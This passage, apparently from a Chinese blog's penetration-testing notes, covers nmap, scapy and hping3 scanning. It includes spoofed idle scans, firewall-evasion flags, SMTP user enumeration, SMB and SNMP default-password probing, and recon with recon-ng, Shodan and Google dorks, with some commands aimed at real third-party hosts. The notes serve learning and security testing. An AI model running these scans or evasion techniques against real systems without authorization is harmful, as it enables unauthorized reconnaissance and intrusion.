<p><img src="img4.jpg" alt="nessus"><br>可以看到我们扫描出来了很多漏洞。<br><img src="img5.jpg" alt="result"><br>可以看到，特别多漏洞，而且点进去紫色的，你会发现更多MS的漏洞。<br><img src="img6.jpg" alt="into"><br>他的检测能力貌似是高于openvas不少，这是因为我在扫描策略的时候增加了用户的密码，而且点进去会看到许多详细信息。<br><img src="img7.jpg" alt="detail"><br>最后点击右上角的Report进行报告的导出。<br><img src="img8.jpg" alt="PDF"><br>可以看到这个就是漏洞报告，PDF的，很漂亮的其实，而且我们点击那个超链接还可以跳转到官网查看详细信息。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙识别</title>
    <url>/2020/04/19/%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h1 id="防火墙的识别"><a href="#防火墙的识别" class="headerlink" title="防火墙的识别"></a>防火墙的识别</h1><p>通过发送一些数据包判断指定的端口是否开放，以下规则比较常见：<br><img src="img1.jpg" alt="防火墙"><br>用nmap的话呢使用-sA这个参数，来匹配一下返回的内容，看下防火墙的一些问题。</p>
<h1 id="负载均衡的识别"><a href="#负载均衡的识别" class="headerlink" title="负载均衡的识别"></a>负载均衡的识别</h1><ul>
<li>轮询：就是隔几秒换一个</li>
<li>区域：每个地方访问的IP不一样</li>
<li>智能：那个在这个时间段快用哪个</li>
</ul>
<p>使用lbd进行识别：<code>lbd www.baidu.com</code></p>
<h1 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h1><p>使用wafw00f进行扫描：<code>wafw00f http://www.baidu.com</code><br>使用nmap进行扫描：<code>nmap www.baidu.com --script=http-waf-detect.nse</code></p>
<h1 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h1><ul>
<li>主机发现：<ul>
<li>-iL参数是对文件中扫描</li>
<li>-iR参数随机扫描，需要提供一个个数</li>
<li>–exclude参数排除指定的IP范围</li>
<li>-sL参数只是单纯的列出IP</li>
<li>-sn参数只是检测存活不做端口扫描</li>
<li>-Pn参数强制发送，彻底删，即使没有收到目标收到的信息nmap还是发送该发送的数据包（防火墙）</li>
<li>-PS/PA/PU/PY参数其实就是进行SYN ACK UDP这些类型的端口扫描</li>
<li>-PE/PP/PM查看输出，时间戳，子网掩码</li>
<li>-PO参数是进行IP层的Ping发现</li>
<li>-n不做域名解析，-R 做反向域名解析</li>
<li>–dns-servers 指定dns服务器</li>
<li>–tracerout参数进行域名跟踪</li>
</ul>
</li>
<li>端口扫描：<ul>
<li>-sS参数使用SYN扫描</li>
<li>-sT全连接扫描</li>
<li>-sA使用ACK的扫描</li>
<li>-sW使用Windows窗口扫描</li>
<li>-sM一个ACK+FIN的数据包</li>
<li>-是sU使用UDP的扫描</li>
<li>-sN参数就是什么都没有</li>
<li>-sF参数就是发一个FIN包</li>
<li>-sX参数就是发一个FIN+PSH+URG的包</li>
<li>–scanflags 指定TCP的flags</li>
<li>-sI参数是僵尸扫描</li>
<li>sY/sZ参数是对SCTP参数扫描</li>
<li>-sO是IP扫描</li>
<li>-b对FTP中继扫描</li>
<li>-p值参数指定端口</li>
<li>U: T:后面跟着端口分别是UDP和TCP（-p U:20 T:21）</li>
<li>-F使用快速扫描，扫的少的意思</li>
<li>-r参数是连续扫描（默认是随机顺序扫描）</li>
<li>-top-ports指定前面的多少个端口</li>
<li>-sV进行服务识别</li>
<li>–version-intensity指定服务扫描深度（0-9）</li>
</ul>
</li>
<li>脚本扫描：<ul>
<li>-sC指定脚本</li>
<li>–script=指定运行到脚本</li>
<li>–script-args=指定参数</li>
<li>–script-updatedb更新脚本</li>
<li>–script-help是查看脚本帮助信息</li>
</ul>
</li>
<li>操作系统检测<ul>
<li>-O参数检测OS</li>
<li>–min-xxxxx这个看文档吧，太多了，就是最少的并行数啊，最少响应时间之类的设置</li>
<li>–scan-delay 10s 每次探测间隔的秒数</li>
</ul>
</li>
<li>防火墙绕过<ul>
<li>-D参数伪造源地址，只是产生噪声IP，迷惑目标系统</li>
<li>-S欺骗原地址一般和-e配合</li>
<li>-e指定网卡接口</li>
<li>-g指定的原端口（nmap使用的）</li>
<li>–proxies使用代理服务器进行扫描</li>
<li>–data=hex  指定我们发送扫描包的时候增加数据</li>
<li>–ip-options设置IP字段</li>
<li>–spoof-mac 欺骗mac地址</li>
<li>–badsum参数发送错误的checksum字段以此来欺骗部分防火墙</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SMTP服务扫描</title>
    <url>/2020/04/19/SMTP%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>邮件服务，我们有时候可以扫描出来管理人的邮件，借此进行社会工程学的攻击。<br>使用nmap在确定开放25这个端口的条件下：<code>nmap smtp.163.com -p 25 -script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}</code><br>有VRFY也可以用RCPT<br>枚举邮件账号：<code>nmap smtp.163.com -p 25 --script=smtp-open-relay.nse</code><br>邮件中介，如果开放了，黑客可以通过你的邮件服务器发送给别人。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SMB服务扫描</title>
    <url>/2020/04/19/SMB%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h1><p>文件共享的一个协议，但是漏洞比较的多。<br>使用nmap进行扫描：<code>nmap -v -p 139 445 192.168.126.1 --open</code><br>-v 是代表我们要查看详细信息，指定139和445端口，我们只查看–open的。<br>这种方式比较幼稚，我们可以使用：<code>nmap 192.168.126.1 -p 139,445 --script=smb-os-discovery.nse</code><br><img src="img1.jpg" alt="smb扫描"><br>这个是用来发现开放SMB主机的。</p>
<p>-Pn参数是强制扫描，有防火墙的时候用到的。<br>我们使用命令：<code>nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse 192.168.209.130</code><br>这条命令可以检测永恒之蓝，最终存在的话呢，会出现以下的显示：<br><img src="img2.jpg" alt="扫描结果"></p>
<p>使用<code>nbtscan -r 192.168.209.0/24</code><br>这个东西有的时候可以支持跨网段的扫描MAC。<br><img src="img3.jpg" alt="nbtscan"></p>
<p>我们使用<code>enum4linux -a 192.168.209.130</code>得到许多我们想要的结果：<br><img src="img4.jpg" alt="enum4linux"><br>可以看到有个Wokrstation Service（他可以去看别人的文件共享）File Server Service(他也开了文件共享)，并且我们还可以空连接进去。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SNMP扫描</title>
    <url>/2020/04/19/SNMP%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h1><p>是一个UDP的协议，并且明文传输，所以有的时候扫描会出错，但是还是开着的。<br>就是用来给运维人员管理操作系统的，但是有的时候会存留有默认的账号密码或者简单的账号密码，我们可以登录进行查看。<br>发送指定的参数可以查看服务器的信息（MIB库），基本的操作是国际规范的，少部分是厂商私有的。<br>通用的密码：public/private/manager<br>使用onesixtyone来查看：<br><code>onesixtyone 192.168.209.1 public</code><br>批量查询：<code>onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.209.1 -o my.log -w 100</code><br>还可以使用snmapwalk：<code>snmpwalk 192.168.209.1 -c public -v 2c</code><br>-v的意思是使用的版本号。当然在后面也可以指定MIB值<br>还可以使用snmpcheck：<code>snmp -t 192.168.209.1</code></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集3</title>
    <url>/2020/04/19/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%863/</url>
    <content><![CDATA[<h1 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h1><p>识别方式：</p>
<ul>
<li>Banner捕获（不太准确）</li>
<li>特定指纹</li>
<li>SNMP分析</li>
<li>防火墙识别</li>
</ul>
<h2 id="Banner信息"><a href="#Banner信息" class="headerlink" title="Banner信息"></a>Banner信息</h2><p><code>nc -nv 192.168.209.1 port</code><br>可以看到返回的内容进行判断。<br><code>dmitry -pb 192.168.209.1</code><br>dmitry发现常用端口的Banner信息。</p>
<p><code>nmap -sT 192.168.209.1 -p 22 --script=banner.nse</code><br>-sT是完整的TCP链接</p>
<p>amap需要先安装：<code>apt-get install amap</code><br>使用-B参数就可以指定获取Banner信息：<code>amap -B 192.168.209.1 1-1000</code></p>
<h2 id="特定指纹"><a href="#特定指纹" class="headerlink" title="特定指纹"></a>特定指纹</h2><p>nmap进行指纹的识别：<code>nmap 192.168.209.1 -p 1-100 -sV</code><br><img src="img1.jpg" alt="nmap"><br><code>amap 192.168.209.1 1-100 -qb</code></p>
<h1 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h1><ol>
<li><p>通过TTL值来判断</p>
<ol>
<li>起始TTL值</li>
<li>Windows：128（65-128）</li>
<li>Linux/Unix：64（1-64）</li>
<li>某些Unix：255</li>
<li>这个方式只能是粗略的判断</li>
</ol>
</li>
<li><p>使用nmap的-O参数进行判断：<code>nmap -O 192.168.209.1</code></p>
<ul>
<li>nmap会返回给我们一个CPE（就是一个国际规范），就是通过特征与这个规范进行匹配，看看最有可能的操作系统是什么。</li>
</ul>
</li>
<li><p>xprobe2</p>
<ol>
<li>这个也需要安装：<code>apt-get install xprobe2</code></li>
<li>使用上就是直接跟一个IP</li>
</ol>
</li>
</ol>
<p>使用被动扫描</p>
<ul>
<li>p0f<ul>
<li>也是需要安装，安装之后直接运行就好了，就可以被动抓包</li>
<li>运行之后就会抓路由的IP，然后进行操作系统的判断</li>
<li><img src="img2.jpg" alt="p0f"></li>
<li>但指纹库可能比较老的原因，好多都没有探测出来</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集2</title>
    <url>/2020/04/18/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>端口扫描是必须要在已知目标IP存活的情况下进行的。</p>
<ol>
<li><p>UDP端口扫描</p>
<ol>
<li>原理就是没有返回的数据包，如果返回的是ICMP的端口不可达，说明没有这个端口，和我们进行主机发现截然相反。</li>
<li>scapy就能，原理就是上面写的。</li>
<li>nmap扫描方法：<code>namp -sU 192.168.209.1</code></li>
<li><img src="img1.jpg" alt="result"></li>
<li>如果跟上-p 端口号，就是指定检测的端口，如果p参数跟上-，代表全端口</li>
<li>如果想查看当前执行状态，按下回车键，nmap就能够告诉我当前状态。</li>
</ol>
</li>
<li><p>TCP端口扫描</p>
<ol>
<li>就是根据三次握手进行端口的扫描，当然也可以通过不完整的握手进行扫描（相对于比较隐蔽），只发送SYN包不回复ACK包</li>
<li>僵尸扫描：<ol>
<li>需要可以进行IP地址伪造</li>
<li>需要一台僵尸机器，这台机器是闲置的</li>
<li>需要IPID（IP头的Identification字段）是递增的，就是发送的数据包这个字段是依次增加的。</li>
<li>首先我们给僵尸机器发送一个SYN/ACK，僵尸机会返回一个RST的数据包（因为没经过握手）</li>
<li>包中会得到一个IPID</li>
<li>这个时候我们再发送一个SYN包给被扫描的主机，这里伪造为僵尸机的IP</li>
<li>被扫描主机会返回给僵尸机一个SYN/ACK包，僵尸机会给被扫描机器返回一个RST包，这里面的IPID是给我们的IPID增加了一的（所以这个僵尸机器是必须要很闲的）</li>
<li>我们再给僵尸机器发送一个SYN/ACK包，僵尸机器再次给我们发送一个RST</li>
<li>这个RST中的IPID是关键，如果IPID=我们之前得到的IPID+2，那么说明目标主机开放，如果IPID=之前的IPID+1说明没有开放。</li>
<li><img src="img2.jpg" alt="存在"></li>
<li><img src="img3.jpg" alt="不存在"></li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="SYN包扫描"><a href="#SYN包扫描" class="headerlink" title="SYN包扫描"></a>SYN包扫描</h2><ol>
<li><p>scapy扫描</p>
<ol>
<li>使用命令<code>sr1(IP(dst=&quot;192.168.209.1&quot;)/TCP(flags=&quot;S&quot;,dport=80),timeout=1).display()</code></li>
<li><img src="img4.jpg" alt="响应"></li>
<li>可以看到响应的是SA=SYN+ACK</li>
<li>但其实抓包发现，我们还发了一个RST包，这个数据包不是scapy发送的是系统发送的，因为我们“莫名其妙”收到了一个SA包。</li>
<li>如果不存在的话呢，会报错，其实是因为我们的返回值是none，但我们还是display造成的。</li>
<li>如果返回的数据包中的flags是RA的话呢也说明不存在。</li>
<li>flags是18的话呢是SA</li>
</ol>
</li>
<li><p>nmap </p>
<ol>
<li>不加参数：<code>nmap 192.168.209.1 -p 1-100</code></li>
<li>nmap先进行DNS反向解析再进行端口扫描</li>
<li>有的时候如果有防护墙，nmap还会将防火墙后面的端口（nmap显示close的）也显示出来，我们可以使用–open参数</li>
<li><code>nmap -sS 192.168.209.1 -p 1-100</code>也是一样的，但是指定是使用SYN的这种扫描方法。</li>
<li>-iL是对一个文件列表扫描</li>
</ol>
</li>
<li><p>hping3</p>
<ol>
<li><code>hping3 192.168.209.1 --scan 1-100 -S</code></li>
<li>这个最终就会打印存在的端口</li>
<li><code>hping3 -c 100 -S --spoof 192.168.209.111 -p ++1 192.168.209.1</code></li>
<li>这个的意思是我们发送是个数据包（-c），使用SYN（-S）发送，–spoof使用地址欺骗（地址是192.168.209.111），-p ++1 代表每次端口递增1，最后就是我们的target。</li>
<li><img src="img5.jpg" alt="欺骗"></li>
<li>可以看到鲨鱼给我们显示的是源地址是我们所要伪造的111</li>
<li>但是我们要看结果的话呢，我们需要在111机器上抓包得到响应包判断端口是否开放。</li>
</ol>
</li>
</ol>
<h2 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h2><p>结果最准确，但是非常不隐蔽。<br>就是正常三次握手进行扫描。<br>首先我们先发送一个SYN包给目标，然后他返回给我们一个数据包，我们再发送一个ACK给他，这个ACK中的TCP部分的ack字段的值要等于得到数据包中的seq字段加一。<br>但是我们单纯这样子做的话呢不能正常的进行握手，因为我们的机器内核会发送RST给目标，目标接收到之后会导致会话终止。<br>避免这种情况的方法：禁用iptables，因为iptables是在内核之前接收到数据包的，不管是发送和接受都要经过他。<br>命令：<code>iptables -A OUTPUT -p tcp --tcp- flags RST RST -d 192.168.209.1 -j DROP</code><br>这句话的意思是，我们增加一个发送数据（OUTPUT）的规则（-A），对于tcp（-p），我们对发送给<code>192.168.209.1</code>（-d）的数据包如果是RST（-flags）的话呢我们就执行动作DROP（-j）。<br>iptables -L 的话呢可以查看当前的规则。</p>
<ol>
<li><p>scapy</p>
<ol>
<li>其实就是上面的那种方式，但是不要忘记增加防火墙的规则</li>
</ol>
</li>
<li><p>nmap</p>
<ol>
<li>-sT参数的话呢是使用全连接的扫描方式</li>
<li><code>nmap -sT 192.168.209.1 -p 1-100</code></li>
<li>速度会慢一点</li>
</ol>
</li>
<li><p>dmitry</p>
<ol>
<li><code>dmitry -p 192.168.209.1</code></li>
<li>上面就是全连接的扫描</li>
</ol>
</li>
<li><p>nc</p>
<ol>
<li>使用nc进行端口的检测</li>
<li><code>nc -nv -w 1 -z 192.168.209.1 1-100</code></li>
<li>n不做域名解析，v显示详细信息，w超时时间，z是扫描</li>
</ol>
</li>
</ol>
<h2 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h2><ol>
<li><p>scapy</p>
<ol>
<li>I=IP()</li>
<li>T=TCP()</li>
<li>RZ=(I/T)</li>
<li>RT=(I/T)</li>
<li>RZ[IP].dst=”192.168.209.134”</li>
<li>RZ[TCP].dport=445</li>
<li>RZ[TCP].flags=”SA”</li>
<li>上面这一些是用来配置僵尸机的</li>
<li>RT[IP].src=”192.168.209.138”</li>
<li>RT[IP].dst=”192.168.209.1”</li>
<li>RT[TCP].dport=25</li>
<li>RT[TCP].flags=”S”</li>
<li>上面是配置扫描主机的</li>
<li>az1=sr1(RZ)</li>
<li>at=sr1(RT,timeout=1)</li>
<li>上面这个是给扫描机器发的，因为肯定收不到回包，所以要定义超时，或者使用send函数（不接收返回数据）</li>
<li>az2=sr1(RZ)</li>
<li>如果最终的az1的IP部分中的ID字段+2=az2中的IP部分中的ID字段</li>
<li>如果是+1，那说明不存在</li>
</ol>
</li>
<li><p>nmap</p>
<ol>
<li>发现僵尸机：<code>nmap -p 445 192.168.209.134 --script=ipidseq.nse</code></li>
<li>使用上面的就可以进行僵尸机判断，如果记过现实Incremental的话呢说明可以</li>
<li><code>nmap 192.168.209.1 -sI 192.168.209.134 -Pn -p 0-100</code></li>
<li>-sI指定僵尸机器，-Pn跳过主机发现</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集1</title>
    <url>/2020/04/17/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861/</url>
    <content><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><p>在与目标主机发生直接关系的情况下，收集最新的信息已经最真实的信息，但是不可避免的是可能被网管发现，所以我们要尽可能的避免被发现，可以使用代理或者其他的机器，再或者发送垃圾信息淹没真实的需求。</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>通过各种协议进行主机的发现。</p>
<h3 id="通过ARP-二层"><a href="#通过ARP-二层" class="headerlink" title="通过ARP(二层)"></a>通过ARP(二层)</h3><p>通过ARP进行主机的发现，速度快，并且很准确，但是缺点就是只能发现本网段的IP，极少数可能会发现其他网段的IP。</p>
<ol>
<li><p>arping 1.1.1.1 -c 1</p>
<ol>
<li>通过这个酒而已判断网段主机是否存活，-c代表发送一个数据包，存在的话呢有返回数据的。</li>
<li>-d参数：判断有没有欺骗（大概就这个功能，其实实际上就是判断一个IP有几个MAC）</li>
</ol>
</li>
<li><p>nmap 使用-sn参数进行主机存活发现（ARP方式）。</p>
<ol>
<li>可以探测出来机器的类型</li>
<li>-il 文件路径 -sn（可以进行文件里面IP的检索）</li>
<li>这个地方他并不是单纯的发送了arp数据包，还发送了DNS的反向域名解析。</li>
</ol>
</li>
<li><p>Netdiscover</p>
<ol>
<li>专用ARP</li>
<li>支持主动和被动</li>
<li>被动的话呢是通过混杂模式（别人发广播包我能听到</li>
<li>netdiscover -i eth0 -r 192.168.1.0/24</li>
<li>netdiscover -p       （混杂模式，被动发现）</li>
</ol>
</li>
<li><p>scapy是Python的一个模块，但是也可以单独拿出来用</p>
<ol>
<li>进入之后使用命令就可以进行数据包的定制</li>
<li>例如使用：ARP().display()  就可以展示如何使用</li>
<li>展示之后可以发现它里面的结构其实就和ARP数据包的结构一样，我们只需要根据我们的需要去改写就好了。</li>
<li>arp=ARP()</li>
<li>arp.pdst=”192.168.209.1”</li>
<li>answer=sr1(arp)</li>
<li>answer.display()</li>
<li>第一句是来定义一个数据包结构，和ARP一样</li>
<li>第二句使用设置变量属性</li>
<li>第三个是发包，并将结果赋值给answer</li>
<li>最后一个是展示数据</li>
</ol>
</li>
</ol>
<p><img src="img1.jpg" alt="响应数据"><br>前面的就是数据，后面的padding是因为arp数据包的长度不够，补零。<br>scapy如果目标不存在，他会一直在发包，所以我们可以给他指定一个timetout超时时间，verbose是报告错误信息。</p>
<h3 id="通过ICMP-三层"><a href="#通过ICMP-三层" class="headerlink" title="通过ICMP(三层)"></a>通过ICMP(三层)</h3><p>第三层使用IP的协议，这个可以跨路由，并且速度快，但是缺点就是很大可能被防火墙拦截，出错率比较高。</p>
<ol>
<li><p>通过ping命令可以进行ICMP的检验，-c参数是个数，-R参数路由追踪（发现比较远的网口IP，而traceroute发现的是比较近的那个网口IP，这都是相对于一个设备，就是说每个经过的每个路由有较远和较近的端口路由）</p>
</li>
<li><p>traceroute是跟踪路由，原理是通过设置TTL从1递增，TTL减为0的时候，将会返回，所以我们可以一个一个追踪出来。</p>
</li>
<li><p>使用scapy进行数据的检验</p>
<ol>
<li>i=IP()</li>
<li>p=ICMP()</li>
<li>ping=(i/p)</li>
<li>ping[ip].dst=”192.168.209.1”</li>
<li>sr1(ping)</li>
<li>第一句和第二句是进行数据的设置，第三个是将两个协议进行拼接（ICMP运行于IP协议之上），第三个是设置IP包头的目的地址</li>
<li>sr1(IP(dst=”192.168.209.1”)/ICMP())</li>
<li>上面的一行就等于上面的所有，ICMP是不需要配置的，自动帮我们配置好了就。</li>
<li>最好还是添加上timeout=0.1这种的时间超时给sr1，这样子快，否则scapy会一直在等待直到主机上线。</li>
</ol>
</li>
<li><p>namp</p>
<ol>
<li>-sn就是会去发送ICMP的数据包判断是否存在，当然在内网的时候会发送arp数据包，但是垮了好多路由的话呢他是会发送ICMP的数据包，也是会进行DNS的一个解析，他还会发送TCP的一个包（貌似是请求时间戳，但是一般不会得到响应）。</li>
</ol>
</li>
<li><p>fping</p>
<ol>
<li>和ping的基本命令很像，但是回显的显示有点不一样</li>
<li>使用-g参数支持对一个地址段进行ping</li>
<li>-f参数对一个文件进行进行发包</li>
</ol>
</li>
<li><p>hping</p>
<ol>
<li>–icmp 是发送ICMP数据包，-c数据个数</li>
</ol>
</li>
</ol>
<h3 id="TCP-UDP-四层"><a href="#TCP-UDP-四层" class="headerlink" title="TCP/UDP(四层)"></a>TCP/UDP(四层)</h3><p>就是通过TCP的端口打开进行一个探测，准确性高，并且三层如果没发现，四层也是可以发现的。<br>优点就是准确性很高，即使有防火墙也有可能发现，但是速度很慢。</p>
<ol>
<li><p>TCP扫描</p>
<ul>
<li>发送未经请求的ACK包，就是说本来要握手的，但是我只发送一个ACK包，服务器会响应一个RST包，我们可以基于这个特性进行一个TCP的扫描IP是否在线。当然也可以发送SYN包进行检测。</li>
</ul>
</li>
<li><p>UDP扫描</p>
<ul>
<li>就是发送数据包，但是我们发送的数据一般不会得到响应（因为我们的数据不是服务器所期望的有效数据），只有当端口不存在的时候服务器才会给我们发送一个ICMP的端口不可达的数据包。</li>
</ul>
</li>
<li><p>scapy</p>
<ol>
<li>i=IP()</li>
<li>t=TCP()</li>
<li>r=(i/t)</li>
<li>r[IP].dst=”192.168.126.1”</li>
<li>r[TCP].flags=”A”</li>
<li>sr1(r)</li>
<li>第五步是指定我们只是单纯的发送一个ACK包</li>
<li><img src="img2.jpg" alt="响应"></li>
<li>可以看到响应的是一个R（RST）的一个包</li>
<li>如果不存在的话呢不能响应（个别会就算存在也不响应）</li>
<li>上面的是TCP，下面说UDP</li>
<li>i=IP()</li>
<li>u=UDP()</li>
<li>r=(i/u)</li>
<li>r[IP].dst=”192.168.126.1”</li>
<li>r[UDP].dport=12321</li>
<li>a=sr1(r)</li>
<li>这个就是要发送一个UDP不存在的端口，理论上会返回一个端口不存在的响应包，但是不知道为什么我的就是没有响应。</li>
<li>当然其实有响应的话呢我们还是要判断一下IP包头中的protocol字段的值是否是1，是1的话呢是ICMP的包。</li>
</ol>
</li>
<li><p>nmap</p>
<ol>
<li>使用命令：<code>nmap 192.168.209.0-200 -PA 5333 -sn</code></li>
<li>这里从0开始是我抓包发现，他貌似第一个并不会跑，所以要跑.1的话呢就要从0开始</li>
<li>上面的命令是说，使用TCP的ACK方式进行检测</li>
<li>当然也可以使用-PU（UDP），-PO（使用三种数据包，ICMP，IPIP包头，IGMP）</li>
</ol>
</li>
<li><p>hping3 </p>
<ol>
<li>使用命令：<code>hping3 --udp 192.168.209.1 -c 1</code> </li>
<li>上述命令准确性不高，存活的话呢就会返回一个ICMP的端口不可达</li>
<li>使用命令：<code>hping3 192.168.209.1 -c 1</code> </li>
<li>上述是TCP的包</li>
<li>但是他发送的flags=0，没有任何标志，返回的话呢是返回一个RST+ACK，获得的话呢就说明存活</li>
<li>但是貌似我的网段不行</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>RECON-NG</title>
    <url>/2020/04/16/RECON-NG/</url>
    <content><![CDATA[<h1 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h1><p>首先我下载的kali自带的是5.0，不好用，需要更新一下：<code>apt-get install recon-ng</code>，更新完毕之后就要更新我们的模块：<code>marketplace refresh</code>，这个样子就好了。</p>
<p>但是好像5.0之后他就大改动了，就不自带模块，模块需要跟着自己去下载。<br>搜索模块：<code>marketplace search google</code><br>搜索完毕之后我们就需要下载：<code>marketplace install google_site_web</code><br>下载的过程还是需要翻墙，下载完毕之后加载模块：<code>modules load google_site_web</code><br>通过<code>info</code>查询参数的信息，发现只有一个SOURCE参数，所以我们只需要设置我们的web站点就可以了。<br>设置参数的内容：<code>options set SOURCE sina.com</code><br>但是在使用之前在模块外面我们需要先设置上我们的代理，因为我们是要访问谷歌。<br>然后<code>run</code>就可以了，最后我们可以看到这个样子的一个结果：<br><img src="img1.jpg" alt="result"><br>使用<code>show hosts</code>可以查看保存的结果。</p>
<p>还有一些模块类似于查询IP之类的，我们是需要通过在表中查询得到结果然后进行数据的获取的。<br>所以最好的使用方法就是提供一个数据库查询语句给模块，然后模块通过数据库查询得到想要查询的内容，最终写入数据库。<br>搜索<code>resolve</code>，可以查看到许多IP解析的模块，我们选择第一个安装使用。<br>设置参数这块比较关键，一个参数，可以是字符串，可以是路径，也可以是查询语句，个人感觉查询语句会好一些，但是在写的时候比较关键的是不要忘记在参数内容前面填写参数的类型，我们可以在info中查询到相关的信息，所以不难得到，我们想要使用查询语句的话呢我们是需要在前面添加：<code>query</code>的。<br>所以我们最后的填写方式：<code>options set SOURCE query select host from hosts</code>，当然查询语句我们是需要指定字段的，类似于*这样子的会导致出错。最终结果就会保存起来。</p>
<p>报告模块也是比较好用的，搜索<code>report</code>就能得到相对应的模块，比较简单，一般第四个参数是一个bool，问你要不要把密码之类的用掩码进行保护起来。</p>
<p>最终模板样式：<br><img src="img2.jpg" alt="模板"></p>
<p>但是需要注意的是，可能会发现有多个重复的域名，这是因为我们之前解析IP的时候，有些域名对应着多个IP。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>被动信息收集2</title>
    <url>/2020/04/15/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862/</url>
    <content><![CDATA[<h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>asn</td>
<td>区域自治编号查询</td>
</tr>
<tr>
<td>port</td>
<td>开放的端口</td>
</tr>
<tr>
<td>org</td>
<td>IP所属组织机构</td>
</tr>
<tr>
<td>os</td>
<td>操作系统</td>
</tr>
<tr>
<td>http.title</td>
<td>网页标题</td>
</tr>
<tr>
<td>http.html</td>
<td>网页内容</td>
</tr>
<tr>
<td>http.server</td>
<td>http请求返回中server的类型</td>
</tr>
<tr>
<td>http.status</td>
<td>http请求返回响应码的状态</td>
</tr>
<tr>
<td>city</td>
<td>城市</td>
</tr>
<tr>
<td>country</td>
<td>国家</td>
</tr>
<tr>
<td>product</td>
<td>软件产品</td>
</tr>
<tr>
<td>vuln</td>
<td>CVE漏洞编号，vuln:CVE-2014-0723</td>
</tr>
<tr>
<td>net</td>
<td>搜索网段或IP，网段的话呢使用/分割</td>
</tr>
<tr>
<td>hostname</td>
<td>主机或者域名</td>
</tr>
</tbody></table>
<p>vuln这个不能给免费用户使用，很烦。<br>在使用过程中发现结果太少的话呢可能是冒号丢失后面需要加上一个空格。</p>
<p>在火狐中是存在shodan的插件的，安装之后，可以在访问网站中查看信息。</p>
<h1 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h1><p>也是很好用，但是在国内还是需要翻墙或者使用插件。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>含有</td>
</tr>
<tr>
<td>-</td>
<td>不含有</td>
</tr>
<tr>
<td>“”</td>
<td>加上双引号是完整搜索</td>
</tr>
<tr>
<td>intitle</td>
<td>标题存在的</td>
</tr>
<tr>
<td>intext</td>
<td>页面中文存在</td>
</tr>
<tr>
<td>inurl</td>
<td>链接中存在的内容</td>
</tr>
<tr>
<td>site</td>
<td>站点名称，也可以是com，cn之类的</td>
</tr>
<tr>
<td>filetype</td>
<td>文件类型搜索，只能搜索文档</td>
</tr>
</tbody></table>
<p>巧用cache缓存可能查看到之前的一些信息。</p>
<p>GHDB中可以查找到相关的许多谷歌搜索的关键字。</p>
<h1 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h1><ol>
